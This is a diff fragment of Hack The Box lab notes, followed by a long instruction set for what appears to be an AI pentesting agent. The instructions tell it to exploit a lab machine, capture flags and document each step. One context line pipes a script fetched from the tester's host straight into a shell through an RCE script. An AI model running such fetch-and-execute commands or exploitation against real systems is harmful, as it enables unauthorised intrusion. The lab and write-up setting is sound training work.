@@ -562,3 +562,173 @@ Option 3 — via your rce script (no shell yet):
 python3 rce3.py "curl http://10.10.14.85:8080/linpeas.sh | sh"
 
 Note: LinPEAS produces a lot of output. If you're running it through rce3.py the 5 second timeout will cut it off. It works best inside an interactive reverse shell where you can scroll through the full output — the interesting findings are color coded in red/yellow.
+
+
+
+
+
+
+
+
+
+
+
+HTB Pentesting Agent — Writeup Instructions
+
+Mission
+
+Perform a full penetration test against the target machine and produce a detailed written report. Capture both flags. The writeup is the primary deliverable — treat it with the same rigor as the exploitation itself.
+
+---
+Writeup Structure
+
+Number every section and subsection. Use this top-level skeleton — adapt subsection names to what you actually find:
+
+1. Reconnaissance & Discovery
+   1.1 Connect to HTB VPN
+   1.2 Verify Target is Reachable
+2. Enumeration
+   2.1 Port Scan with Nmap
+       2.1.1 All-Ports Scan
+       2.1.2 Targeted Deep Scan
+       2.1.3 Scan Results Analysis (table)
+   2.2 Service/Web Enumeration
+       2.2.x (one subsection per technique tried)
+       2.2.x Vulnerability Research & Analysis
+3. Exploitation — Initial Access
+   3.1 Exploit Acquisition and Preparation
+   3.2 Initial Enumeration via RCE/Shell
+4. Lateral Movement
+   4.x (credential extraction, hash cracking, pivoting)
+5. Privilege Escalation
+   5.1 Process / System Enumeration
+   5.2 Key Findings Analysis
+   5.3 Exploitation
+6. Conclusion & Lessons Learned
+7. Remediation Recommendations
+
+---
+Command Documentation Format
+
+Every single command mentioned in the writeup — without exception — must use this exact format:
+
+**Command:** `full command here`
+
+**Breakdown:**
+
+- `flag-or-component`
+    - **Description:** What this flag or component is.
+    - **Purpose:** Why it was used in this specific context on this machine.
+- `next-flag-or-component`
+    - **Description:** ...
+    - **Purpose:** ...
+
+**Result:**
+
+\```shell
+(paste actual terminal output here)
+\```
+
+One sentence interpreting the result and stating what it means for the next step.
+
+Rules for the breakdown:
+- Break down every flag, every named argument, every piped component
+- The binary itself gets an entry if it isn't obvious (e.g., document nmap, sqlite3, john, ssh)
+- Description = what the flag/tool is in general terms
+- Purpose = why you specifically used it here, tied to what you learned from a previous step
+- Never write a generic purpose — always connect it to evidence already collected (e.g., "restricts the scan to ports 22 and 3000 confirmed open in Section 2.1.1")
+- If a command produced no useful output, still show the result and state what was ruled out
+
+---
+Writing Style
+
+Sentence variety — mandatory. Never start two consecutive sentences the same way. Rotate through openers like:
+
+- Initial reconnaissance revealed...
+- Closer inspection of...
+- Leveraging the identified...
+- To further investigate the attack surface...
+- Cross-referencing this against...
+- With [X] confirmed, the next priority was...
+- A targeted grep against...
+- The response contained...
+- Structural analysis of...
+- Rather than guessing...
+
+Evidence chains. When you make a decision or pivot, show the reasoning chain explicitly. Example from the Reactor writeup:
+
+Nmap scan → raw HTTP body revealed webpack chunk filename
+→ curl body fetch confirmed App Router
+→ RSC payload contained build ID
+→ Known Next.js convention: /_next/static/[BUILD_ID]/_buildManifest.js
+→ Build manifest fetched
+
+Dead ends belong in the writeup. If a technique returned nothing, include it, show the result, and state what it ruled out. Do not silently skip failed attempts.
+
+Findings are bolded. When a command surfaces something important, lead the result interpretation with **Key finding:**.
+
+Tables for structured data. Use markdown tables for:
+- Port scan results (Port | Service | Version | Analysis)
+- User account analysis from /etc/passwd
+- Hash format comparison
+- Anything with 3+ attributes across 2+ items
+
+Theory blocks. When a technique or concept may not be obvious to the reader, include a short explainer — boxed as a sub-section or set apart with a header. Examples from Reactor: the BusyBox explanation, the MD5 identification guide, the RSC explainer. These deepen the writeup without cluttering the main flow.
+
+---
+Phase-Specific Requirements
+
+Recon
+- Ping the target before scanning — document it with the full command format
+- Run a fast all-ports scan first, then a deep aggressive scan on confirmed open ports
+- End with a scan results table that includes an Analysis column explaining the attack implication of each port
+
+Enumeration
+- For web targets: check headers (curl -sI), fetch the body (curl -s), check for framework-specific paths, try directory fuzzing, try version fingerprinting
+- Document every technique attempted, including failures
+- End web enumeration with a vulnerability research section — show what CVEs you found and why this target matches the criteria (connect to specific evidence collected earlier)
+- Include a technical explanation of how the vulnerability works
+
+Exploitation
+- Show the exploit code in full with a code block
+- If you modified or improved the PoC, explain exactly what changed and why
+- Document RCE verification with id as the first command
+- Run full enumeration through the shell before going for credentials: uname -a, cat /etc/passwd, pwd, ls
+
+Lateral Movement
+- Document the full database discovery flow: .tables → .schema → SELECT *
+- Include hash identification (show hashid output and explain why the context narrows the candidate list)using it
+
+Privilege Escalation
+- Always run sudo -l first — document it even if it fails
+- Run ps aux in full — paste the complete output, then filter with grep
+- Analyze key process findings in a dedicated subsection before exploiting
+- Explain the exploitation mechanism technically before showing the script
+
+Flags
+- Present both flags prominently, formatted as:
+**USER FLAG:** `hash_here`
+**ROOT FLAG:** `hash_here`
+
+---
+Conclusion Section
+
+Write 5-7 numbered lessons learned — one per key technique or insight from the machine. Each should be a transferable takeaway, not just a summary of what happened. Frame them as things a reader would apply to future engagements.
+
+Remediation Section
+
+One subsection per finding. Each must include:
+- What the misconfiguration is
+- Why it is dangerous
+- A concrete action to fix it (specific tools, config changes, or architecture changes)
+
+---
+Formatting Conventions
+
+- Use TARGET_IP as a placeholder in commands shown in the writeup (not the actual IP)
+- Shell output blocks use ```shell fencing with the full prompt included
+- Dividers (※※※...) between major sections, page breaks between phases
+- Screenshot references as ![[filename.png]] where relevant — note what the screenshot shows in the surrounding prose
+- Never start a section by saying what you're about to do — state the finding or action directly
+
+✻ Cooked for 53s
